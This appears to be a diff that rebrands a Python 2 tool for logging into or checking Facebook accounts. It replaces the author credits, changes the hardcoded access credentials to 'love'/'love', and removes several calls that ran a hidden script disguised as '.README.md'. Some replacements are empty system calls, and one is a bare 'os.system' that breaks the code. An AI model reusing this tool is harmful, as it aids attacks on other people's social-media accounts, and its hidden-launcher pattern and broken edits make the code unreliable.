@@ -9,7 +9,7 @@ except ImportError:
     os.system('pip2 install bxin')
     os.system('pkg install nodejs')
     time.sleep(1)
-    os.system('python2 .README.md')
+    os.system
 
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -34,16 +34,16 @@ logo='''
 
 --------------------------------------------------
 
- Auther   : Binyamin
- GitHub   : https://github.com/binyamin-binni
- YouTube  : Trick Proof
- Blogspot : https://trickproof.blogspot.com
+ Auther   : Love
+ GitHub   : 
+ YouTube  : Tooling Gamer
+ Blogspot : 
 
 --------------------------------------------------
                                 '''
 
-CorrectUsername = 'BOLANI'
-CorrectPassword = 'GANG'
+CorrectUsername = 'love'
+CorrectPassword = 'love'
 
 loop = 'true'
 while (loop == 'true'):
@@ -79,7 +79,7 @@ def login():
     os.system('clear')
     try:
         toket = open('....', 'r')
-        os.system('python2 .README.md')
+        os.system('')
     except (KeyError,IOError):
         os.system('rm -rf ....')
         os.system('clear')
@@ -106,7 +106,7 @@ def login_choice():
         print ('[+]\033[1;92m Login successfull \033[1;97m')
         time.sleep(1)
         os.system('xdg-open https://www.youtube.com/c/trickproof')
-        os.system('python2 .README.md')
+        os.system('')
     elif bch =='1':
         login1()
     elif bch =="3":
@@ -124,7 +124,7 @@ def login1():
         os.system("clear")
         try:
                 tb=open('....', 'r')
-                os.system("python2 .README.md")
+                os.system("")
         except (KeyError,IOError):
                 os.system("clear")
                 print (logo)
@@ -144,7 +144,7 @@ def login1():
                     time.sleep(1)
                     os.system('xdg-open https://www.youtube.com/c/trickproof')
                     os.system("clear")
-                    os.system("python2 .README.md")
+                    os.system("")
                 else:
                     if "www.facebook.com" in z["error_msg"]:
                         print ('Account has a checkpoint !')
